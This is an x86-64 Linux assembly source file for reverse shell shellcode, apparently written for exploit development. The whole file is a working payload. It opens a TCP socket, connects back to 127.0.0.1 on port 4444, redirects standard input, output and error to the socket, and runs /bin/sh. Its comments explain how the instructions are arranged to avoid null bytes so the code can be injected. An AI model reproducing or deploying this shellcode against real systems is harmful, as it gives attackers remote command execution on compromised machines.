global _start

section .text

_start:

    xor rax,rax
    xor rdi,rdi
    xor rsi,rsi
    xor rdx,rdx
    xor r10, r10
    xor r8,r8
    xor r9,r9

    ;  // sycall socketcall (sys_socket 1)
    ; sockfd = socket(AF_INET, SOCK_STREAM, 0);
    ; socket.AF_INET == 2
    ; socket.SOCK_STREAM == 1
    mov al, 41
    mov dil, 2
    mov sil, 1
    syscall

    mov rdi, rax ; store returned sockfd value to rdi


    ; server.sin_family = AF_INET;
    ; server.sin_port = htons(atoi(argv[1]));
    ; server.sin_addr.s_addr = inet_addr("127.0.0.1");
    xor rax, rax
    push rax
    ; below can't be done with a direct move as there were too many null bytes
    ; mov dword [rsp-4], 0x0100007f; binascii.hexlify(socket.inet_aton("127.0.0.1")[::-1])
    add byte [rsp-4], 0x7f
    inc byte [rsp-1]
    mov word [rsp-6], 0x5c11; hex(socket.htons(4444))
    ; below is done this way because mov word [rsp-8], 2 had a null byte in it
    ; mov word [rsp-8], 2
    xor r9, r9
    mov byte [rsp-7], r9b
    mov byte [rsp-8], 2; AF_INET == 2
    sub rsp, 8

    ; syscall 42
    ; connect(sock, (struct sockaddr *)&server, sockaddr_len);
    xor rax, rax
    mov al, 42
    mov rsi, rsp
    xor rdx, rdx
    mov dl, 16
    syscall

    ; // syscall 33
    ; dup2(resultfd, 2);
    ; dup2(resultfd, 1);
    ; dup2(resultfd, 0);
    xor rax, rax
    mov al, 33
    xor rsi, rsi
    syscall
    xor rax, rax
    mov al, 33
    inc rsi
    syscall
    xor rax, rax
    mov al, 33
    inc rsi
    syscall

    ; // syscall 59
    ; execve("/bin/sh", NULL, NULL);
    xor rax, rax
    mov al, 59
    xor rbx,rbx
    push rbx
    mov  rcx, 0x68732f2f6e69622f ; "/bin//sh"[::-1].encode('hex')
    push rcx
    mov rdi, rsp

    push rbx
    mov rdx, rsp

    push rdi
    mov rsi, rsp
    syscall